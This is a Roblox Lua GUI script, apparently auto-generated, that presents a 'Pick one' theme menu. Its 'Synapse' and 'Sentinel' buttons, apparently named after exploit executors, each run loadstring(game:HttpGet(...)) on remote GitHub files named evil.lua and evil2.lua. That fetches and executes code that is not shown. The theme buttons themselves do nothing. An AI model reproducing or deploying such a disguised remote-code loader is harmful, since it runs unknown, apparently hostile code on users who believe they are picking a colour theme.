-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local main = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local button = Instance.new("Frame")
local TextButton = Instance.new("TextButton")
local TextButton_2 = Instance.new("TextButton")
local TextButton_3 = Instance.new("TextButton")
local TextButton_4 = Instance.new("TextButton")
local TextButton_5 = Instance.new("TextButton")
local TextButton_6 = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

main.Name = "main"
main.Parent = ScreenGui
main.BackgroundColor3 = Color3.fromRGB(108, 108, 108)
main.Position = UDim2.new(0.345468044, 0, 0.358009726, 0)
main.Size = UDim2.new(0, 415, 0, 234)

TextLabel.Parent = main
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Size = UDim2.new(0, 415, 0, 43)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Pick one"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

button.Name = "button"
button.Parent = ScreenGui
button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
button.BackgroundTransparency = 1.000
button.Position = UDim2.new(0.345468044, 0, 0.410194188, 0)
button.Size = UDim2.new(0, 415, 0, 141)

TextButton.Parent = button
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.Position = UDim2.new(0, 0, 0.183760688, 0)
TextButton.Size = UDim2.new(0, 123, 0, 37)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "Light Theme"
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true

TextButton_2.Parent = button
TextButton_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_2.Position = UDim2.new(0.351807237, 0, 0.183760688, 0)
TextButton_2.Size = UDim2.new(0, 123, 0, 37)
TextButton_2.Font = Enum.Font.SourceSans
TextButton_2.Text = "Dark Theme"
TextButton_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_2.TextScaled = true
TextButton_2.TextSize = 14.000
TextButton_2.TextWrapped = true

TextButton_3.Parent = button
TextButton_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_3.Position = UDim2.new(0.703614473, 0, 0.183760688, 0)
TextButton_3.Size = UDim2.new(0, 123, 0, 37)
TextButton_3.Font = Enum.Font.SourceSans
TextButton_3.Text = "Grape Theme"
TextButton_3.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_3.TextScaled = true
TextButton_3.TextSize = 14.000
TextButton_3.TextWrapped = true

TextButton_4.Parent = button
TextButton_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_4.Position = UDim2.new(0.703614473, 0, 0.841880322, 0)
TextButton_4.Size = UDim2.new(0, 123, 0, 37)
TextButton_4.Font = Enum.Font.SourceSans
TextButton_4.Text = "Synapse"
TextButton_4.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_4.TextScaled = true
TextButton_4.TextSize = 14.000
TextButton_4.TextWrapped = true
TextButton_4.MouseButton1Down:connect(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/RealModking/testpage/main/evil.lua'))()
	main.Visible = false
	button.Visible = false
end)

TextButton_5.Parent = button
TextButton_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_5.Position = UDim2.new(0.351807237, 0, 0.841880322, 0)
TextButton_5.Size = UDim2.new(0, 123, 0, 37)
TextButton_5.Font = Enum.Font.SourceSans
TextButton_5.Text = "Sentinel"
TextButton_5.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_5.TextScaled = true
TextButton_5.TextSize = 14.000
TextButton_5.TextWrapped = true
TextButton_5.MouseButton1Down:connect(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/RealModking/testpage/main/evil2.lua'))()
	main.Visible = false
	button.Visible = false
end)


TextButton_6.Parent = button
TextButton_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_6.Position = UDim2.new(0, 0, 0.841880322, 0)
TextButton_6.Size = UDim2.new(0, 123, 0, 37)
TextButton_6.Font = Enum.Font.SourceSans
TextButton_6.Text = "Blood Theme"
TextButton_6.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_6.TextScaled = true
TextButton_6.TextSize = 14.000
TextButton_6.TextWrapped = true
